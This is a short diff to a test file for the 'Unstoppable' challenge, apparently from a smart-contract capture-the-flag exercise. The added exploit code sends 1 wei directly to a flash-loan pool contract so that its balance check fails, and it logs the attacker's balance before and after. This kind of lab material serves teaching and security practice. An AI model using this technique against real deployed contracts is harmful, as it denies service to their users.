@@ -40,6 +40,14 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log("Starting Exploit"); 
+        console.log("Attacker balance");
+        console.log(await this.token.balanceOf(attacker.address));
+        console.log("transfer 1 wei from attacker to pool contract from the token's transfer function")
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
+        console.log("Attacker balance");
+        console.log(await this.token.balanceOf(attacker.address));
+        
     });
 
     after(async function () {
